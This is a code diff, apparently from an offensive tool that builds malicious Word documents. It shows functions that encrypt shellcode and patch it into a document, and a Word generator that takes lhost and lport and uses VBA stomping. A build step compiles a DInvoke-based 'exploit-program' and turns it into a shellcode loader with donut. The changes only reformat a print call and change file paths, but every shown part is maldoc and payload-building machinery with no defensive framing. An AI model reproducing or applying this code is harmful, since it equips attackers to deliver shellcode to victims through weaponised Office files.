@@ -829,8 +829,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     doc_data = doc_path.read_bytes()
     raw_shellcode = shellcode_path.read_bytes()
 
-    print(
-        f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
+    print(f"[+] Loaded {len(raw_shellcode)} bytes of shellcode from '{shellcode_path}'.")
     print(f"{password=}")
 
     b64_payload = openssl_pbkdf2_encrypt(raw_shellcode, password)
@@ -976,7 +975,7 @@ $dinvokePath = "C:\Tools\NuGetPkgs\DInvoke.1.0.4\lib\net35\DInvoke.dll"
 $sma = [System.Management.Automation.PowerShell].Assembly.Location
 & C:\Windows\Microsoft.NET\Framework\v4.0.*\csc.exe /resource:"$dinvokePath",DInvoke.dll /reference:"$sma" /target:exe /platform:anycpu /out:exploit-program.exe .\stage-12.cs /optimize+ /d:TRACE /filealign:512
 cd donut*
-.\donut.exe ..\exploit-program.exe -o ..\loader.bin
+.\donut.exe ..\exploit-program.exe -o ..\exploit-program.bin
 cd ..
 download ./exploit-program.exe /tmp/loader.exe
 download ./exploit-program.bin /tmp/loader.bin
@@ -1051,7 +1050,9 @@ def generate_word_file_aes(lhost, lport, proxy, id, template_path: str, stomp_vb
     with NamedTemporaryFile(delete=False) as output_file:
         output_path = pathlib.Path(output_file.name)
     
-    shellcode_path = pathlib.Path("/mnt/exploits/DInvoke/bin/loader-eth0-80-stager-vba-eth0-4f02037210b546e096513f690b24974f.bin")
+    # shellcode_path = pathlib.Path("/mnt/exploits/DInvoke/bin/loader-eth0-80-stager-vba-eth0-4f02037210b546e096513f690b24974f.bin")
+
+    shellcode_path = pathlib.Path("/tmp/loader.bin")
 
     patch_document(doc_path, shellcode_path, output_path, password)
 
